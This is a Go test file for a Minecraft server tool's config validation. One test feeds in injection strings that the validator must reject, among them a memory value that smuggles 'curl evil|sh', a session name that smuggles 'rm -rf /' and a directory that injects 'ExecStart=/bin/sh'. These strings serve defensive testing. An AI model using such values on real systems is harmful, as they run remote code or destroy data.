package config

import (
	"strings"
	"testing"
)

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test-server"

	if err := cfg.Validate(); err != nil {
		t.Fatalf("default config should be valid: %v", err)
	}
}

func TestValidate_InvalidEdition(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"
	cfg.Edition = "invalid"
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for invalid edition")
	}
}

func TestValidate_InvalidServerType(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"
	cfg.ServerType = "invalid"
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for invalid server type")
	}
}

func TestValidate_InvalidDifficulty(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"
	cfg.Difficulty = "invalid"
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for invalid difficulty")
	}
}

func TestValidate_InvalidGameMode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"
	cfg.GameMode = "invalid"
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for invalid gamemode")
	}
}

func TestValidate_InvalidGC(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"
	cfg.GCType = "invalid"
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for invalid gc type")
	}
}

func TestValidate_InvalidPort(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"

	cfg.Port = 0
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for port 0")
	}
	cfg.Port = 70000
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for port 70000")
	}
}

func TestValidate_EmptyDir(t *testing.T) {
	cfg := DefaultConfig()
	if err := cfg.Validate(); err == nil {
		t.Fatal("expected error for empty dir")
	}
}

func TestValidate_NormalizesGC(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Dir = "/tmp/test"
	cfg.GCType = "ZGC"
	if err := cfg.Validate(); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.GCType != "zgc" {
		t.Fatalf("expected gc to be normalized to zgc, got %s", cfg.GCType)
	}
}

func TestValidateRejectsInjectableValues(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		mutate  func(*ServerConfig)
		wantErr string
	}{
		{
			name:    "motd with newline",
			mutate:  func(c *ServerConfig) { c.MOTD = "Welcome\nrcon.password=hacked" },
			wantErr: "motd must not contain control characters",
		},
		{
			name:    "motd with carriage return",
			mutate:  func(c *ServerConfig) { c.MOTD = "Welcome\rmotd=other" },
			wantErr: "motd must not contain control characters",
		},
		{
			name:    "dir with newline",
			mutate:  func(c *ServerConfig) { c.Dir = "/srv/mc\nExecStart=/bin/sh" },
			wantErr: "server directory must not contain control characters",
		},
		{
			name:    "memory with shell metacharacters",
			mutate:  func(c *ServerConfig) { c.Memory = `2G"; curl evil|sh; x="` },
			wantErr: "invalid memory",
		},
		{
			name:    "memory without unit suffix",
			mutate:  func(c *ServerConfig) { c.Memory = "2048" },
			wantErr: "invalid memory",
		},
		{
			name:    "empty memory",
			mutate:  func(c *ServerConfig) { c.Memory = "" },
			wantErr: "invalid memory",
		},
		{
			name:    "session name with quote",
			mutate:  func(c *ServerConfig) { c.SessionName = `mc'; rm -rf /; '` },
			wantErr: "invalid session name",
		},
		{
			name:    "empty session name",
			mutate:  func(c *ServerConfig) { c.SessionName = "" },
			wantErr: "session name must be set",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			cfg := DefaultConfig()
			cfg.Dir = "/srv/minecraft"
			tt.mutate(cfg)

			err := cfg.Validate()
			if err == nil {
				t.Fatal("expected a validation error")
			}
			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Fatalf("error = %v, want it to contain %q", err, tt.wantErr)
			}
		})
	}
}

func TestValidateAcceptsRealisticValues(t *testing.T) {
	t.Parallel()

	// Paths with spaces are normal on macOS and Windows and must stay valid.
	for _, dir := range []string{"/srv/minecraft", "/Users/a b/Minecraft Server", `C:\Users\a b\mc`} {
		cfg := DefaultConfig()
		cfg.Dir = dir
		if err := cfg.Validate(); err != nil {
			t.Fatalf("dir %q rejected: %v", dir, err)
		}
	}

	for _, mem := range []string{"2G", "4g", "2048M", "512m"} {
		cfg := DefaultConfig()
		cfg.Dir = "/srv/minecraft"
		cfg.Memory = mem
		if err := cfg.Validate(); err != nil {
			t.Fatalf("memory %q rejected: %v", mem, err)
		}
	}

	// MOTD with section-sign colour codes and emoji must stay valid.
	cfg := DefaultConfig()
	cfg.Dir = "/srv/minecraft"
	cfg.MOTD = "§6Dad's Server §r— welcome! 🎮"
	if err := cfg.Validate(); err != nil {
		t.Fatalf("MOTD rejected: %v", err)
	}
}
